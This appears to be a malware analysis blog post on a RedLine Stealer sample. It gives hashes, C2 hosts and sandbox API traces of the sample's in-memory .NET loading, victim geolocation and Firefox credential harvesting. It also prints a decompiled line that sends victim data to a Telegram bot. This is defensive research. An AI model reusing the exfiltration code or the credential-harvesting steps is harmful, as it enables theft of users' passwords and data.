---
title: "RedLine Stealer"
date: 2025-02-14
---

<link rel="stylesheet" href="/css/main.css">

## RedLine Stealer

## Context  

SHA256 : 420f888c8bc5a5e5c71b6c157e7a8ed83527bb4893605f7c827cccd89f286cbc  
source : [bazaar.abuse.ch](https://bazaar.abuse.ch/sample/420f888c8bc5a5e5c71b6c157e7a8ed83527bb4893605f7c827cccd89f286cbc/)  
VT : [VirusTotal](https://www.virustotal.com/gui/file/420f888c8bc5a5e5c71b6c157e7a8ed83527bb4893605f7c827cccd89f286cbc)  

Network :  
<http://checkip.dyndns.org/>  
<https://reallyfreegeoip.org/xml/>  

C2:  
api.telegram.org  
http://varders.kozow.com:8081  
http://aborters.duckdns.org:8081  
http://anotherarmy.dns.army:8081  

Report:  
<https://www.infosecinstitute.com/resources/malware-analysis/redline-stealer-malware-full-analysis/>  

Analysed redline stealer sample is a 32bit .NET DLL packaged within a 32bit executable.  

As usual, results from dynamic analysis are shared in my repository ([logs](https://github.com/cedricg-mirror/reflexions/blob/main/CyberCrime/Redline_Stealer/420f888c8bc5a5e5c71b6c157e7a8ed83527bb4893605f7c827cccd89f286cbc/logs.txt))  

Targeted softwares for credentials harvesting are shared in [target.txt](https://github.com/cedricg-mirror/reflexions/blob/main/CyberCrime/Redline_Stealer/420f888c8bc5a5e5c71b6c157e7a8ed83527bb4893605f7c827cccd89f286cbc/targets.txt).    

---  

***Commentary***

Runtime is divided in two main phases, the Win32 loader and the .NET payload.  
I haven't given too much thoughts regarding runtime analysis of .NET programs so far, but as it turns out it is still possible to collect many relevant information by indirectly looking at .NET behavior through Native Image DLL.  

---  

# In memory loading of the .NET DLL payload  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <CLRCreateInstance> in [mscoree.dll] 
[PAR] REFCLSID  clsid       : 0x41b230 ({9280188D-0E8E-4867-B30C-7FA83884E8DE})
[PAR] REFIID    riid         : 0x41b220 (ICLRMetaHost)
[PAR] LPVOID    *ppInterface : 0x269f6d0
[RET] 0x4021be

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <ICLRMetaHost::GetRuntime> in [mscoreei.dll] 
[PAR] LPCWSTR pwzVersion : 0x269f7c8 ("v4.0.30319")
[PAR] REFIID  riid       : 0x41b240 (ICLRRuntimeInfo)
[PAR] LPVOID  *ppRuntime : 0x269f6d4
[RET] 0x402215

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <ICLRRuntimeInfo::GetInterface> in [mscoreei.dll] 
[PAR] REFCLSID  clsid    : 0x41b210 ({74E03258-9E84-74E0-E013-960201000000})
[PAR] REFIID    riid     : 0x41b290 (ICorRuntimeHost)
[PAR] LPVOID     *ppUnk  : 0x269f69c
[RET] 0x40223b

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <ICorRuntimeHost::Start> in [clr.dll] 
[RET] 0x40224f

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <ICorRuntimeHost::GetDefaultDomain> in [clr.dll] 
[PAR] IUnknown **pAppDomain : 0x269f6a8
[RET] 0x4022b1

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <IUnknown::QueryInterface> in [clr.dll] 
[PAR] REFIID    riid         : 0x41b270 (_AppDomain)
[PAR] LPVOID    *ppv         : 0x269f6a4
[RET] 0x4022d9

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <SafeArrayCreate> in [OLEAUT32.dll] 
[PAR] VARTYPE         vt         : 0x11
[PAR] UINT            cDims      : 0x1
[PAR] SAFEARRAYBOUND  *rgsabound : 0x269f6d8
[FLD]                 rgsabound[0]
[FLD]                 -> cElements = 0x48000
[FLD]                 -> lLbound   = 0x0
[RET] 0x4022fc

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <SafeArrayAccessData> in [OLEAUT32.dll] 
[PAR] SAFEARRAY *psa       : 0x2967a58
[FLD]            -> cDims      = 0x1
[FLD]            -> fFeatures  = 0x80
[FLD]            -> cbElements = 0x1
[FLD]            -> cLocks     = 0x0
[FLD]            -> pvData     = 0x2991d90
[FLD]            -> cElements  = 0x48000
[FLD]            -> lLbound    = 0x0
[PAR] void      ** ppvData : 0x269f698
[RET] 0x40230e

DumpFile created : \DosDevices\C:\rtl_dump\MemDotNetD 

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <SafeArrayUnaccessData> in [OLEAUT32.dll] 
[PAR] SAFEARRAY *psa : 0x2967a58
[FLD]            -> cDims      = 0x1
[FLD]            -> fFeatures  = 0x80
[FLD]            -> cbElements = 0x1
[FLD]            -> cLocks     = 0x1
[FLD]            -> pvData     = 0x2991d90
[FLD]            -> cElements  = 0x48000
[FLD]            -> lLbound    = 0x0
[RET] 0x402324
```

This in-memory loading of managed code is well described here :  

<https://0xpat.github.io/Malware_development_part_9/>  

The loaded .NET DLL is dumped automatically by my sandbox and is now available here :  

[VirusTotal](https://www.virustotal.com/gui/file/af724ba9b889c902ae248039a93b86d53613dc966e648e4fe54ca2b10d0ea712/)    
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/af724ba9b889c902ae248039a93b86d53613dc966e648e4fe54ca2b10d0ea712/)    

--- 

# Network fingerprinting  

Once the managed code is effectivly loaded in memory, one of its first steps is to 'localize' the victim through the following requests :  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <send> in [WS2_32.dll] 
[PAR] SOCKET s    : 0x40c
[PAR] char   *buf : 0x4540064
[STR]        -> "GET / HTTP/1.1"
[STR]           "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)"
[STR]           "Host: checkip.dyndns.org"
[STR]           "Connection: Keep-Alive"
[STR]           ""
[PAR] int    len  : 0x97
[RET] 0x72d60c27
```

which will reply with something like :  

```html
<html><head><title>Current IP Check</title></head><body>Current IP Address: 23.154.177.2</body></html>
```

And parsed by the malware to extract the IP address :  

```csharp
return (object) end.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString();
```

Then another free service is requested to localize the victim from its external IP :  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <GetAddrInfoW> in [WS2_32.dll] 
[PAR] PCWSTR     pNodeName    : 0x454b8ec
[STR]            -> "reallyfreegeoip.org"
[PAR] PCWSTR     pServiceName : 0x0 (null)
[PAR] ADDRINFOW  *pHints      : 0x269d690
[FLD] PADDRINFOW    pAddrInfo : 0x269d690
[FLD]               -> ai_flags     = 0x2 (AI_CANONNAME)
[FLD]               -> ai_family    = 0x0 (AF_UNSPEC)
[FLD]               -> ai_socktype  = 0x0 (UNKNOWN_FLAG)
[FLD]               -> ai_protocol  = 0x0 (NOT_SPECIFIED)
[FLD]               -> ai_addrlen   = 0x0
[FLD]               -> ai_canonname = 0x0 (null)
[FLD]               -> *ai_addr     = 0x0
[FLD]               -> *ai_next     = 0x0
[PAR] PADDRINFOW *ppResult    : 0x269d638
[RET] 0x72d6279e

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <WSAConnect> in [WS2_32.dll] 
[PAR] SOCKET   s     : 0x448
[PAR] sockaddr *name : 0x454dd28
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 47873 (Little endian : 443)
[FLD]          -> sin_addr     : 169.254.143.43
[RET] 0x72d60bb5
```

The request is encrypted through HTTPS, it is nonetheless possible to get the clear content by looking at the right place :  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <SealMessage> in [SspiCli.dll] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x454fa40
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x4556cb0
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x4556cc8
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x4556b10
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0x57
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x4556b15
[STR]                   -> "GET /xml/199.195.250.42 HTTP/1.1\r\nHost: reallyfreegeoip.org\r\nConnection: Keep-Alive\r\n\r\n"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x4556b6c
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x72d63857
```

as well as getting the clear text from the answer :  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[API] <DecryptMessage>
[PAR] PSecBufferDesc pMessage     : 0x0
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x455737c
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x4556e34
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0x473
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x0000000004556E39
[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Thu, 13 Feb 2025 00:18:55 GMT\r\nServer: Apache\r\ncache-control: max-age=31536"
[STR]                      "000\r\ncf-cache-status: HIT\r\nage: 235\r\nlast-modified: Wed, 12 Feb 2025 19:45:47 GMT\r\nreport-to: {"endpoints":[{"ur"
[STR]                      "l":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=VBpNaBGrtxpdt4dpqT3IJDtGp%2BxqmYFp10jCgKuiFX3dEfsjXpB29sCbvDv4Bw7msGnT8"
[STR]                      "lxh6J7IIHDyX4lSsaO45mtee7KvKdU4CqyHQNDW7aWENyGlC1ol2VsW1oZTbVMfWeNbnq%2BJWSpQmG8iE7R7"}],"group":"cf-nel","max_age":6048"
[STR]                      "00}\r\nnel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}\r\ncf-ray: 910f1a7e4d40971e-AMS\r\nalt-svc: h2="
[STR]                      ""cflareub6dtu7nvs3kqmoigcjdwap2azrkx5zohb2yk7gqjkwoyotwqd.onion:443"; ma=86400; persist=1\r\nVary: Accept-Encoding\r\nCo"
[STR]                      "ntent-Length: 328\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/xml;charset=UTF-8\r\"
[STR]                      "n\r\n<Response><IP>199.195.250.42</IP><CountryCode>FR</CountryCode><CountryName>France</CountryName><RegionCode>IDF</Reg"
[STR]                      "ionCode><RegionName>Ile-de-France</RegionName><City>Paris</City><ZipCode>75001</ZipCode><TimeZone>Europe/Paris</TimeZone"
[STR]                      "><Latitude>48.8323</Latitude><Longitude>2.4075</Longitude><MetroCode>0</MetroCode></Response>"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x1d
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x45572ac
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0
[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
```

Various information are then extracted by the malware from the XML :  

```csharp
XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionCode");
XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionName");
```

Finaly the payload is attempting to establish a HTTPS communication with a telegram bot :  

```csharp
 string requestUriString = "https://api.telegram.org/bot" + _param0 + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
```

Unfortunatly something might be missing in my analysis environnment because the Bot TOKEN as well as the chat ID are missing from the captured request :  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <SealMessage> in [SspiCli.dll] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x45b383c
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x45b5ad4
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x45b5aec
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x15
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x45b5894
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0x150
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x00000000045B58A9
[STR]                   -> "GET /bot/sendMessage?chat_id=&text=%20%0D%0A%0D%0APC%20Name:HOME%0D%0ADate%20and%20Time:%2013/02/2025%20/%2001:18:58%0D%"
[STR]                      "0ACountry%20Name:%20France%0D%0A%5B%20HOME%20Clicked%20on%20the%20File%20If%20you%20see%20nothing%20this's%20mean%20the%"
[STR]                      "20system%20storage's%20empty.%20%5D HTTP/1.1\r\nHost: api.telegram.org\r\nConnection: Keep-Alive\r\n\r\n"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x40
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x45b59f9
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x72d63857
```

---  

# Credential harvesting

Even without beeing able to establish a connection with the telegram bot, the malware nonetheless proceeds with its credential harvesting procedure :  

```html
[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <FindFirstFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName : 0x4672760
[STR]         -> "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\*"
[RET] 0x7398b488

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <GetFullPathNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName    : 0x269e6a0
[STR]         -> "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\1t6va5x4.default"
[PAR] DWORD   nBufferLength : 0x105
[PAR] LPWSTR  lpBuffer      : 0x269e474
[PAR] LPWSTR* lpFilePart    : 0x0
[RET] 0x7398da93

[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <GetFullPathNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName    : 0x269e65c
[STR]         -> "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\1t6va5x4.default\logins.json"
[PAR] DWORD   nBufferLength : 0x105
[PAR] LPWSTR  lpBuffer      : 0x269e430
[PAR] LPWSTR* lpFilePart    : 0x0
[RET] 0x7398da93
```

The full list of targeted application is provided in [target.txt](https://github.com/cedricg-mirror/reflexions/blob/main/CyberCrime/Redline_Stealer/420f888c8bc5a5e5c71b6c157e7a8ed83527bb4893605f7c827cccd89f286cbc/targets.txt).  

--- 

# Countermesures

If the malware is unable to retrieve it's external IP address the following crash is triggered :

```html
[ * ] [pid 0xbec][tid 0x5e8] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <CreateAssemblyNameObject> in [clr.dll] 
[PAR] LPASSEMBLYNAME *ppAssemblyNameObj : 0x25ae010
[PAR] LPCWSTR        szAssemblyName     : 0x46d3c18
[STR]                -> "System.resources, Version=4.0.0.0, Culture=fr-FR, PublicKeyToken=b77a5c561934e089"
[PAR] DWORD          dwFlags            : 0x1
[PAR] LPVOID         pvReserved         : 0x0
[RET] 0x73314cbe

[ * ] [pid 0xbec][tid 0x5e8] c:\windows\syswow64\svchost.exe
[ i ] [ Called from Native Image DLL ]
[API] <CreateAssemblyNameObject> in [clr.dll] 
[PAR] LPASSEMBLYNAME *ppAssemblyNameObj : 0x25add28
[PAR] LPCWSTR        szAssemblyName     : 0x46d82f4
[STR]                -> "mscorlib.resources, Version=4.0.0.0, Culture=fr-FR, PublicKeyToken=b77a5c561934e089"
[PAR] DWORD          dwFlags            : 0x1
[PAR] LPVOID         pvReserved         : 0x0
[RET] 0x73314cbe
```

![Crash](/docs/assets/images/RedLineStealer/fail.jpg)

The same behavior is observed if a debugger is detected : 

```html
[ * ] [pid 0xa08][tid 0x884] c:\users\user\desktop\redline_stealer\redline.exe
[API] <IsDebuggerPresent> in [KERNEL32.DLL] 
[RET] 0x143b92
```
